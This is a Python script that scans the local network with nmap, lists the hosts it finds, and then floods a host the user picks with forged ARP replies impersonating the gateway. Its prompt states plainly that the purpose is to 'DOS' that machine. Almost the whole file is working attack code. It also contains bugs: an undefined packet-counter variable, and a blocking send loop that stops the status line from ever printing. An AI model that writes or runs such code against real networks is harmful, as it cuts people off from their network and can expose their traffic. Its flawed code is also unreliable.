import sys
import time
from netaddr import IPAddress
import os
import socket
#from scapy.all import ARP
import scapy.all as scapy
import netifaces
import nmap

def getGate():
	gate = netifaces.gateways()
	return gate['default'][netifaces.AF_INET]

def netScan():
	map = nmap.PortScanner()
	cidr =IPAddress(netprop['netmask']).netmask_bits()
	map.scan(hosts=netprop['addr']+'/'+str(cidr) , arguments='-sn')
	retVal=[]

	for h in map.all_hosts():
		mac = "Not Found"
		vend = "Not Found"
		host = map[h]
		if 'mac' in host['addresses']:
			mac = host['addresses']['mac']
			if mac in host['vendor']:
				vend = host['vendor'][mac]

		RHOST = {'ip': h, 'mac': mac, 'vendor': vend}
		retVal.append(RHOST)

	return retVal

def printHosts(hosts):
	x = 0
	hostnames = []
	print ("{:<8} {:<23} {:<20} {:<15}".format('ID','HostName','IP', 'Device'))
	for host in hosts:
		try:
			hostnames.append(socket.gethostbyaddr(host['ip'])[0])
		except socket.herror:
			hostnames.append('Hostname Unavailable')

	

	
		print ("{:<8} {:<23} {:<20} {:<15}".format(str(x),hostnames[-1],str(host['ip']),host['vendor']))
		x=x+1
	return hostnames


def spoofer(choice):

	target = netHosts[int(choice)]
	print(target)
	sent_packet = 0
	while True:
		packet = scapy.ARP(op=2, pdst=target['ip'], hwdst=target['mac'], psrc=gateway)
		scapy.send(packet, verbose=False, inter=20, loop=1)
		print("\r[+] Sent packets: " + str(sent_packets)),
            # only flush the UI for the bit not wrapped in \r
		sys.stdout.flush()
		time.sleep(2)





gateway = getGate()[0]
interface = getGate()[1]

#there is more info you can get from this like netmask addr broadcast just ask in [] when deref
netprop = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
netHosts = netScan()
print(type(netHosts[0]['vendor']))
hostnames = printHosts(netHosts)
spoofer(input("\nChoose an ID number you wish to DOS"))
